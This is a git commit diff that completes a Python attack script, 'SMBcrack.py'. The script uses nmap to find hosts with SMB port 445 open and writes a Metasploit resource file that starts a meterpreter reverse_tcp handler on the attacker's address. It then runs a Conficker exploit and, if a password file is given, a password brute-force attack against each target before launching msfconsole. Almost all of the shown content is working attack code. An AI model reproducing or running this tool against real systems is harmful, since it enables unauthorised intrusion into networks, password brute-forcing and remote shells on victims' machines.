f90023f235cbc700d12780e78eb969392922accf
pilias <pilias@it.auth.gr>
2018-12-09 18:09:50 +0200

    Completed SMBBrute script

--- SMBcrack.py
+++ SMBcrack.py
@@ -1,9 +1,12 @@
+import os
+import optparse
+import sys
 import nmap
 def findTgts(subNets):
 	nmScan = nmap.PortScanner()
 	nmScan.scan(subNet, '445')
 	tgtHosts = []
-	for host in nmScan.all_hosts()
+	for host in nmScan.all_hosts():
 		if nmScan[host].has_tcp(445):
 			state = nmScan[host]['tcp'][445]['state']
 			if state == 'open':
@@ -14,7 +17,8 @@ def findTgts(subNets):
 def setupHandler(configFile, lhost, lport):
 	configFile.write('use exploit/multi/handler\n')
 	configFile.write('set PAYLOAD '+ 'windows/meterpreter/reverse_tcp\n')
-	configFile.write('set LPORT ' + strlport + '\n')
+	configFile.write('set LPORT ' + str(lport) + '\n')
+	configFile.write('set LHOST ' + lhost + '\n')
 	configFile.write('exploit -j -z\n')
 	configFile.write('setg DisablePayloadHandler 1\n')
 
@@ -39,3 +43,29 @@ def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
 		configFile.write('set LPORT ' + str(lport) + '\n')
 		configFile.write('set LHOST ' + lhost + '\n')
 		configFile.write('exploit -j -z\n')
+def main():
+	configFile = open('meta.rc', 'w')
+	parser = optparse.OptionParser('[-] Usage%prog '+ '-H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
+	parser.add_option('-H', dest='tgtHost', type='string', help='specify the target address[es]')
+	parser.add_option('-p', dest='lport', type='string', help='specify the listening port')
+	parser.add_option('-l', dest='lhost', type='string', help='specify the listening address')
+	parser.add_option('-F', dest='passwdFile', type='string', help='password file for SMB brute force attempt')
+	(options, args) = parser.parse_args()
+	if (options.tgtHost == None) | (options.lhost == None):
+		print parser.usage
+		exit(0)
+	lhost = options.lhost
+	lport = options.lport
+	if lport == None:
+		lport = '1337'
+	passwdFile = options.passwdFile
+	tgtHosts = findTgts(options.tgtHost)
+	setupHandler(configFile, lhost, lport)
+	for tgtHost in tgtHosts:
+		confickerExploit(configFile, tgtHost, lhost, lport)
+		if passwdFile != None:
+			smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
+	configFile.close()
+	os.system('msfconsole -r meta.rc')
+if __name__=='__main__':
+	main()
